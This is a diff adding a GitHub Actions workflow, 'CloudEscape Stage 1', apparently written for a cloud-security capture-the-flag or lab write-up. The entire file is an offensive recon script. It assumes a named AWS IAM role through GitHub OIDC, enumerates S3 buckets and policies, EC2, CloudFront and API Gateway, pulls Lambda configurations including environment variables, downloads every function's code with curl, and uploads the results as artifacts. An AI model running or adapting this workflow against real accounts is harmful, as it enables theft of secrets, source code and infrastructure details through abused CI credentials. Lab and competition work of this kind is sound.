@@ -1,0 +1,94 @@
+name: CloudEscape Stage 1
+on:
+  workflow_dispatch:
+  push:
+    branches: [corgi]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      # ── 1. Assume cicdRole via GitHub OIDC ──
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+          output-credentials: true
+
+      # ── 2. Confirm identity ──
+      - name: Get Caller Identity
+        run: aws sts get-caller-identity
+
+      # ── 3. List ALL buckets ──
+      - name: List S3 Buckets
+        run: aws s3 ls
+
+      # ── 4. List Lambda functions + configs ──
+      - name: List Lambda Functions
+        run: |
+          aws lambda list-functions --region us-east-1 | tee lambda_list.json
+          # For each function, get configuration (env vars, role, layers) + download code
+          for fname in $(jq -r '.Functions[].FunctionName' lambda_list.json); do
+            echo "===== FUNCTION: $fname ====="
+            aws lambda get-function-configuration --function-name "$fname" --region us-east-1 | tee "config_$fname.json"
+            # Download the actual code
+            CODE_URL=$(aws lambda get-function --function-name "$fname" --region us-east-1 --query 'Code.Location' --output text)
+            if [ "$CODE_URL" != "null" ]; then
+              curl -s -o "code_$fname.zip" "$CODE_URL"
+              echo "Downloaded code to code_$fname.zip"
+            fi
+          done
+
+      # ── 5. EC2 enumeration ──
+      - name: EC2 Recon
+        run: |
+          echo "===== VPCs ====="
+          aws ec2 describe-vpcs --region us-east-1
+          echo "===== Subnets ====="
+          aws ec2 describe-subnets --region us-east-1
+          echo "===== Instances ====="
+          aws ec2 describe-instances --region us-east-1
+          echo "===== Security Groups ====="
+          aws ec2 describe-security-groups --region us-east-1
+
+      # ── 6. CloudFront ──
+      - name: CloudFront Recon
+        run: aws cloudfront list-distributions
+
+      # ── 7. List objects in interesting buckets ──
+      - name: S3 Bucket Enumeration
+        run: |
+          for bucket in $(aws s3 ls | awk '{print $3}'); do
+            echo "===== BUCKET: $bucket ====="
+            aws s3 ls "s3://$bucket/" --region us-east-1 || true
+            aws s3api get-bucket-policy --bucket "$bucket" --region us-east-1 || true
+            aws s3api get-bucket-policy-status --bucket "$bucket" --region us-east-1 || true
+          done
+
+      # ── 8. Check for Lambda Function URLs / API Gateway ──
+      - name: Check Lambda URLs and API Gateway
+        run: |
+          # Check for function URLs
+          for fname in $(jq -r '.Functions[].FunctionName' lambda_list.json); do
+            echo "===== Function URL config: $fname ====="
+            aws lambda get-function-url-config --function-name "$fname" --region us-east-1 2>/dev/null || echo "No URL for $fname"
+          done
+          # API Gateway
+          echo "===== API Gateway REST APIs ====="
+          aws apigateway get-rest-apis --region us-east-1 2>/dev/null || echo "apigateway not available"
+          echo "===== API Gateway HTTP APIs ====="
+          aws apigatewayv2 get-apis --region us-east-1 2>/dev/null || echo "apigatewayv2 not available"
+
+      # ── 9. Upload artifacts for write-up screenshots ──
+      - uses: actions/upload-artifact@v4
+        with:
+          name: cloudescape-recon
+          path: |
+            lambda_list.json
+            config_*.json
+            code_*.zip
